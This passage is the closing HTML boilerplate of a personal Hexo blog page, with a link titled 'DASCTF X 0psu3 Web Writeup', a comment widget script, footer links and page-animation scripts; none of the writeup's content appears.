                    <h3 class="title">DASCTF X 0psu3 Web Writeup</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>